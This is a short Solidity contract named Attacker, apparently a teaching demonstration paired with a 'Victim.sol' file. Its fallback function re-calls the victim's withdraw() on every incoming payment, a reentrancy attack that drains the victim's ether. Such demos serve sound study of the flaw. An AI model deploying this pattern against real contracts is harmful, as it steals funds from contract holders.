pragma solidity ^0.4.8;

import './Victim.sol';

contract Attacker {
  Victim victim;

  function Attacker(address victimAddress) {
    victim = Victim(victimAddress);
  }

  function attack() {
    victim.withdraw();
  }

  // Fallback function which is called whenever Attacker receives ether
  function () payable {
    if (victim.balance >= msg.value) {
      victim.withdraw();
    }
  }
}